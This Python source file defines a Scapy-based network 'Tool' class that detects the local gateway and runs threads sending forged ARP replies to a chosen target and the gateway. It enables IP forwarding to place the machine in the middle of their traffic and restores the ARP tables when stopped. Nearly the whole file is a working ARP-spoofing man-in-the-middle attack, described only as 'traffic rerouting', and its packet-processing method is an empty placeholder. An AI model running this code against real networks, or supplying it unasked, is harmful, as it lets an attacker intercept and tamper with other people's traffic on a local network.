import os
import getpass
import netifaces
import logging
import subprocess  # For subprocess.run()
import threading  # For threading.Thread and threading.Lock
import time  # For time.sleep()
import errno  # For errno (used for error checking in threads)

from scapy.all import *  #  Import all of Scapy
from scapy.all import IP, Ether
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from textcolors import TextColors

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class Tool:

    def __init__(self, interface=None, greet=False, use_scapy_forwarding=False):
        self.console = Console()
        self._interface = interface
        self.greet = greet
        self.use_scapy_forwarding = use_scapy_forwarding
        self.stop_event = threading.Event()  # Crucial: make sure it's in __init__
        self.poison_threads_lock = threading.Lock()  # Add lock
        self.forwarding_thread = None  # Initialize forwarding thread

        # Initialize network info immediately
        self.initialize()

        if (
            greet and self.is_network_info_available()
        ):  # Greet only if initialization was successful
            self.greet_user()

    def initialize(self):
        """Retrieves and stores network information."""
        try:
            self._interface = self._get_default_interface()
            if self._interface is None:
                raise RuntimeError(
                    "No suitable network interface found."
                )  # Raise exception to be caught

            self._gateway_ip = self._get_default_gateway()
            self._own_ip = self._get_own_ip()
            self._own_mac = self._get_own_mac()

            if not all([self._gateway_ip, self._own_ip, self._own_mac]):
                logger.warning(
                    "Some network information could not be retrieved."
                )  # Consistent Logging
        except (
            KeyError,
            IndexError,
            ValueError,
            OSError,
            AttributeError,
            RuntimeError,  # Catch the potential RuntimeError
        ) as e:
            self.console.print(
                f"{TextColors.FAIL}Error during initialization: {e}{TextColors.ENDC}",
                style="bold red",
            )
            # Clear network info on failure
            self._interface = None
            self._gateway_ip = None
            self._own_ip = None
            self._own_mac = None

    def greet_user(self):
        """Presents a colorful greeting to the user, including network info."""
        username = getpass.getuser()
        greeting_table = Table(title=f"Welcome, {username}!", style="bold cyan")
        greeting_table.add_row("Network Tool Initialized")
        greeting_table.add_row(
            f"Interface: {self._interface or 'N/A'}"
        )  # Shows N/A if not available
        greeting_table.add_row(f"Gateway IP: {self._gateway_ip or 'N/A'}")
        greeting_table.add_row(f"Own IP: {self._own_ip or 'N/A'}")
        greeting_table.add_row(f"Own MAC: {self._own_mac or 'N/A'}")

        self.console.print(Panel(greeting_table, border_style="green", expand=False))

    def is_network_info_available(self):
        """Checks if all required network information is available."""
        return all([self._interface, self._gateway_ip, self._own_ip, self._own_mac])

    def _get_default_interface(self):  # Same logic but better error reporting
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_default_gateway(self):  # Same logic, improved logging
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][0]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_own_ip(self):  # Improve error handling logic
        try:
            ifaddresses = netifaces.ifaddresses(self._interface)
            if netifaces.AF_INET in ifaddresses:
                return ifaddresses[netifaces.AF_INET][0]["addr"]
            else:
                logger.error(f"No IPv4 address found for interface: {self._interface}")
                return None

        except ValueError as e:
            logger.error(f"Invalid interface specified: {e}")  # Better Logging
            return None

    def _get_own_mac(self):  # Logging error with more information
        try:
            return get_if_hwaddr(self._interface)
        except OSError as e:
            logger.error(
                f"Error getting MAC address for {self._interface}: {e}"
            )  # Log useful details
            return None

    # ... (Getter methods remain the same)
    def get_interface(self):
        return self._interface

    def get_gateway_ip(self):
        return self._gateway_ip

    def get_own_ip(self):
        return self._own_ip

    def get_own_mac(self):
        return self._own_mac

    #       Traffic rerouting logic
    #######

    def _get_mac(self, ip_address):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                timeout=2,
                verbose=0,
            )
            if ans:
                return ans[0][1].hwsrc
            else:
                logger.error(f"Failed to resolve MAC address for {ip_address}")
                return None
        except Exception as e:
            logger.error(f"Error getting MAC address: {e}")
            return None

    def _restore_arp(self):
        if (
            self.target_ip
            and self._gateway_ip  # Use the class's stored gateway IP
            and self.target_mac
            and self.gateway_mac
            and self._interface
        ):  # Check if all needed vars are defined
            try:
                send(
                    ARP(
                        op=2,
                        pdst=self._gateway_ip,  # _gateway_ip
                        hwdst=self.gateway_mac,
                        psrc=self.target_ip,
                        hwsrc=self.target_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                send(
                    ARP(
                        op=2,
                        pdst=self.target_ip,
                        hwdst=self.target_mac,
                        psrc=self._gateway_ip,  # _gateway_ip
                        hwsrc=self.gateway_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                logger.info("ARP table restored.")
            except Exception as e:
                logger.error(f"Error restoring ARP: {e}")
        else:
            logger.warning("Could not restore ARP table. Information missing.")

    def start_rerouting(self, target_ip):
        if not self.is_network_info_available():
            raise RuntimeError(
                "Network information not available. Initialize the tool first."
            )

        self.poison_threads = []  # List for poisoning threads  # Moved and cleared here
        self.poison_threads_lock = threading.Lock()

        self.target_ip = target_ip
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(self._gateway_ip)
        # self.stop_event = threading.Event()  # Create the stop event  <- moved to __init__

        if not all([self.target_mac, self.gateway_mac]):
            raise ValueError("Failed to resolve MAC addresses for target or gateway.")

        try:
            if self.use_scapy_forwarding:
                self.forwarding_thread = threading.Thread(
                    target=self._scapy_forwarding_loop, daemon=True
                )  # Corrected: daemon=True
                self.forwarding_thread.start()
                logger.info("Using Scapy IP forwarding")

            else:  # Default to sysctl if use_scapy_forwarding is False
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
                logger.info("Using sysctl IP forwarding")

            # ---  ARP Poisoning Threads (This part mostly stays the same but with the lock) ---
            with self.poison_threads_lock:  # <--- Important: use the lock here
                self.poison_threads = [
                    threading.Thread(
                        target=self._poison_thread,
                        args=(self.target_ip, self.target_mac, self._gateway_ip),
                        daemon=True,
                    ),
                    threading.Thread(
                        target=self._poison_thread,
                        args=(self._gateway_ip, self.gateway_mac, self.target_ip),
                        daemon=True,
                    ),
                ]

            for (
                thread
            ) in (
                self.poison_threads
            ):  # Start poisoning threads *after* forwarding setup
                thread.start()

            logger.info(
                f"Started rerouting traffic for {target_ip}"
            )  # After starting all threads

        except Exception as e:
            # --- Exception Handling (Crucial for cleanup) ---
            with self.poison_threads_lock:
                self._restore_arp()
                if self.poison_threads:
                    for (
                        thread
                    ) in (
                        self.poison_threads
                    ):  # Ensures this is run only if the thread list is not empty
                        thread.join()
                    self.poison_threads = []  # Clear after stopping threads

            if self.use_scapy_forwarding and self.forwarding_thread:
                self.stop_event.set()
                self.forwarding_thread.join()

            logger.exception(f"Error during rerouting setup: {e}")
            raise  # Re-raise after cleanup

    def _poison_thread(self, target_ip, target_mac, source_ip):
        """The ARP poisoning thread function."""
        poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
        while not self.stop_event.is_set():  # check stop flag before sending packet
            try:
                send(poison_packet, verbose=0)
                time.sleep(2)  # Adjust the sleep for a less aggressive heartbeat
            except OSError as e:  # Handle potential OS errors (e.g. network down)
                if e.errno == errno.ENETDOWN:
                    logger.error(f"Network interface down: {e}")
                    break  # Exit thread
                else:
                    raise

    def stop_rerouting(self):
        with self.poison_threads_lock:  # Acquire lock before using threads list
            if self.poison_threads:
                self.stop_event.set()  # Signal threads to stop
                for thread in self.poison_threads:
                    thread.join()  # Wait for threads to finish
                self._restore_arp()

                # Conditionally disable IP forwarding
                if not self.use_scapy_forwarding:  # Only disable if sysctl was used
                    subprocess.run(
                        ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
                    )

                logger.info("Traffic rerouting stopped and ARP table restored.")
                self.poison_threads = []  # Clear the list after stopping threads
                self.stop_event.clear()  # Reset for next use
            else:
                logger.warning("Rerouting was not active.")

        # Stop Scapy forwarding thread *outside* the lock:
        if (
            self.use_scapy_forwarding and self.forwarding_thread
        ):  # Check if thread running
            self.stop_event.set()  # Stop forwarding loop
            if self.forwarding_thread.is_alive():
                self.forwarding_thread.join()  # Give it time to finish
            self.forwarding_thread = None  # Clear to restart next time if needed.
            logger.info("Stopped Scapy forwarding thread.")

    def _scapy_forwarding_loop(self):
        """Uses Scapy's L3socket to forward packets."""

        try:
            with conf.L3socket() as fwd:  # Use conf.L3socket() for OS-independent forwarding

                while (
                    not self.stop_event.is_set()
                ):  # Exit gracefully if stop_rerouting is called
                    try:
                        packet = fwd.recv(1024, timeout=1)  # Optimized receive size
                        if packet:
                            if IP in packet:
                                # Simple forwarding (modify as needed based on how you want to handle packets):
                                if packet[IP].dst == self.target_ip:
                                    packet[Ether].dst = self.target_mac
                                elif packet[IP].dst == self._gateway_ip:
                                    packet[Ether].dst = self.gateway_mac
                                fwd.send(packet)
                    except socket.timeout:
                        pass  # Just check for stop flag periodically
                    except Exception as e:
                        logger.error(
                            f"Error in forwarding loop: {e}"
                        )  # Add exception handling
                        break  # Break out of the loop on error

        except Exception as e:
            logger.exception(
                f"Error creating Scapy forwarding socket: {e}"
            )  # Log for debugging.

    def process_packet(self, packet):  # Placeholder for now—needs implementation.
        pass  # Placeholder.  This method needs to be implemented as per requirements.

    #       Scapy handling IP forwarding
